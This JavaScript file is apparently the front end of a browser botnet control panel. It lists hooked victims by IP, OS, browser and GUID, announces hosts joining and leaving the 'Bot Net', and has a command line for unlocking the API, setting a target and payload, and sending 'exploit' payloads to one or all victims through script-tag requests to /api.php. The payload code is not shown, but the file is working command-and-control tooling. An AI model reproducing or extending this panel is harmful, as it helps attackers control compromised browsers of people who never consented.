function foc() { 
	/*
	var e = window.event;
	var x = e.clientX;
	var y = e.clientY;
	elm = document.elementFromPoint(x, y);
	if (elm.id != "out_content") { document.getElementById("cmd").focus(); }
	*/
	 document.getElementById("cmd").focus();
}
window.onkeydown = foc;
console.log("focus");
window.setInterval(fetchList, 3000);
//window.setInterval(foc, 5000);
console.log("timeout");

var params = {};
params['target'] = "all";
params['payload'] = "alert";
params['message'] = "payload 1";
var gpass = "";
var gbuffer = [];
var gbidx = -1;
var glistSz = 0;

function exploit() {
	var opts = "";
	for (x in params) { opts += "&" + x + "=" + encodeURIComponent(params[x]); }
	cs("/api.php?auth="+gpass+"&A=exploit"+opts);
	com_out("sending " + params['payload'] + " to " + params['target']);
}

function fetchList() {
	if (gpass) { 
		cs("/api.php?auth="+gpass+"&A=list");
	}
}
function update_debug() {
	var o = "<div class='debug'>";
	for (x in debugLog) {
		o += x + "<br />";
	}
	o += "<div>";

	document.getElementById("out_content").innerHTML += o;
}
function show_host(i) {
	var o = "<dl>"
	for (var x in host_list[i]) {
		o += "<dt>"+x+"</dt>";
		o += "<dl>"+host_list[i][x]+"</dl>";
	}
	o += "</dl>";

	document.getElementById("out_title").innerHTML = "Detail Host (" + host_list[i]['remote_ip'] + ")";
	document.getElementById("out_content").innerHTML = o;
	cs("/api.php?A=debug&guid="+host_list[i]['guid']+"&auth="+gpass);
}

function target(g) { params['target'] = g; com_out("target set to " + g);}

function update_list() {
	var o = "<ul>";
	for (var i in host_list) {
		o += "<li class=\""+host_list[i]['class']+"\" onclick=\"show_host("+i+")\"><img width=\"16\" src=\"/ico/"+host_list[i]['os']+".png\" /> <img width=\"16\" src=\"/ico/"+host_list[i]['browser']+".png\" /><strong>"+host_list[i]['remote_ip']+"</strong><img src=\"/ico/target.png\" width=\"16\" onclick=\"target('"+host_list[i]['guid']+"')\" class=\"right\"/></li>";
	}
	o += "</ul>";
	document.getElementById("list_title").innerHTML = "Bot Net (" + host_list.length + ")";
	document.getElementById("list_content").innerHTML = o;
	if (host_list.length > glistSz) { com_out("Host Joined The Bot Net"); }
	if (host_list.length < glistSz) { com_out("Host Left The Bot Net"); }
	glistSz = host_list.length;
}
function cs(s) { //console.log("cs: " + s); 
	var script = document.createElement("script");
	script.type="text/javascript";
	script.src=s;
	d=document.getElementById("inject");
	d.appendChild(script);
}
//	append("<script src='"+s+"'></script>"); }
function append(t) {d = document.getElementById('inject');console.log(d);r=d.innerHTML;console.log(r);d.innerHTML=t; }
function com_out(t) { var e = document.getElementById('cmd_content'); e.innerHTML += t + "<br />"; e.scrollIntoView(false); e.scrollTop = e.scrollHeight; }
function show_options() { for (x in params) { com_out(x + " = " + params[x]); } }


function docommand(event) {
elm = document.getElementById("cmd");
if(event && event.keyCode == 13) {
	gbuffer.push(elm.value);
	gbidx++;
	var p = elm.value.split(" ");
	switch(p[0]) {
		case "unlock":
			gpass= p[1];
			com_out("password set<br />API unlocked");
			break;

		case "show":
			show_options();

		case "set":
			if (p.length > 2) {
				var name = p[1]
				var v = p.slice(2).join(" ");
				params[name] = v
				com_out(name + " set to " + v);
				//console.log(p);
				//console.log(p[1] = params[p[1]]);
			}
			break;

		case "exploit":
			exploit();
			break;
	}

	elm.value = "";
}

else if (event && event.keyCode == 38) {
	//if (gbidx == gbuffer.length -1 && elm.value.length > 0) { console.log("push!"); gbuffer.push(elm.value); }
	console.log(gbidx +  " up " +  gbuffer.length);
	if (gbidx > 0) {
		//gbidx--;
		elm.value = gbuffer[gbidx--];
	}
} else if (event && event.keyCode == 40) {
	console.log(gbidx +  " down " + gbuffer.length);
	if (gbidx < gbuffer.length) {
		//gbidx++;
		elm.value = gbuffer[gbidx++];
	} if (gbidx >= gbuffer.length) {
		elm.value = "";
	}
}

}
